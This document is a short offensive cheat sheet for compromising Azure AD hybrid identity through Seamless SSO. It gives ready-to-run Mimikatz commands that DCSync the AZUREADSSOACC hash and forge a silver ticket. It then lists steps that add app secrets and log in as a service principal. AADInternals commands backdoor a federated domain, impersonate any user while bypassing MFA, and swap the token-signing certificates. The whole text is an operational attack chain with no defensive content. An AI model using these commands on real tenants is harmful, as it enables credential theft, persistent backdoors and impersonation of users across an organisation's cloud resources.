# Hybrid identity - Seamless SSO

Seamless Single Sign-On (SSO) is a feature supported by both Pass-Through Authentication (PTA) and Password Hash Synchronization (PHS) in Azure AD. 

It enables users to access Azure AD-integrated resources seamlessly without the need to re-enter their credentials.

## Steps:

### 1) Obtain NTLM hash of AZUREADSSOC Account

    Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\azureadssoacc$ /domain:<DOMAIN> /dc:<DC NAME>"'

### 2) Create a Silver Ticket

    Invoke-Mimikatz -Command '"kerberos::golden /user:<USERNAME> /sid:<SID> /id:1108 /domain:<DOMAIN> /rc4:<HASH> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'

### 3) Add credentials to Enterprise Applications

    . .\Add-AzADAppSecret.ps1

    Add-AzADAppSecret -GraphToken $graphtoken -Verbose

### 4) Authenticate as a Service Principal using the secret

    $password = ConvertTo-SecureString '<SECRET>' -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential('<ACCOUNT ID>', $password)

    Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <TENANT ID>

### 5) Check resource accessible to the service principal

    Get-AzResource

### 6) Federation

Create a trusted domain and configure its authentication type to federated

    Import-Module .\AADInternals.psd1
    ConvertTo-AADIntBackdoor -DomainName <DOMAIN>

### 7) Obtain the immutable ID of the user you want to impersonate

    Get-MsolUser | select userPrincipalName,ImmutableID

### 8) Access ANY cloud app as the user

    Open-AADIntOffice365Portal -ImmutableID <ID> -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA $true

### 9) Token Signing Certificate

With Domain Admin privileges on the on-premises AD, create and import new token signing and token decrypt certificates

    Import-Module .\AADInternals.psd1
    New-AADIntADFSSelfSignedCertificates

### 10) Update the certificate information with Azure AD

    Update-AADIntADFSFederationSettings -Domain <DOMAIN>
